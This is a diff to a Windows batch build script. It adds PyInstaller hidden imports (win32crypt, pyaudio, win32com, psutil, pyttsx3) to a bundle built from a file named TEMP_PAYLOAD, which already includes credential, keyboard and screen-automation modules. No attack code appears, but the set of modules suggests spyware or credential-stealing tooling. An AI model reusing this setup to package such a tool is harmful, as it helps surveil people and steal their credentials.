@@ -75,6 +75,12 @@ py -3.11 -m PyInstaller ^
     --hidden-import win32cred ^
     --hidden-import sqlite3 ^
     --hidden-import cryptography ^
+    --hidden-import psutil ^
+    --hidden-import pyaudio ^
+    --hidden-import win32crypt ^
+    --hidden-import win32com ^
+    --hidden-import win32com.client ^
+    --hidden-import pyttsx3 ^
     --hidden-import _cffi_backend ^
     --collect-all pyautogui ^
     --collect-all keyboard ^
@@ -88,6 +94,9 @@ py -3.11 -m PyInstaller ^
     --collect-all numpy ^
     --collect-all requests ^
     --collect-all cryptography ^
+    --collect-all psutil ^
+    --collect-all pyaudio ^
+    --collect-all win32com ^
     "%TEMP_PAYLOAD%"
 
 REM Rimuovi file temporaneo
